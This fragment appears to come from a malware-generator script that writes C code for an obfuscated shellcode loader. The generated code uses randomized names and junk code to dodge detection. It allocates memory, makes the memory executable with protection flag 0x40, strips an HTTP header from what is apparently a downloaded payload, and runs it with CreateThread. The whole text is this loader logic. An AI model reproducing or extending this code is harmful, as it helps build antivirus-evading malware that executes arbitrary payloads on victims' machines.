...
Hollow_code += Randpointer1 + " = VirtualAlloc(0, 1000000, MEM_COMMIT, PAGE_READWRITE);\n"
...
Hollow_code += "BOOL " + Randbool + " = VirtualProtect(" + Randpointer1 + ",1000000,0x40,&" + Oldprot + ");\n"
Hollow_code += Randpointer1 + " = strstr(" + Randpointer1 + ", \"\\r\\n\\r\\n\") + 4;\n"
Hollow_code += Junkcode_18
Hollow_code += Randhand + " = CreateThread(NULL,0,(LPVOID)" + Randpointer1 + ",NULL,0,&"+ Randthread + ");\n"
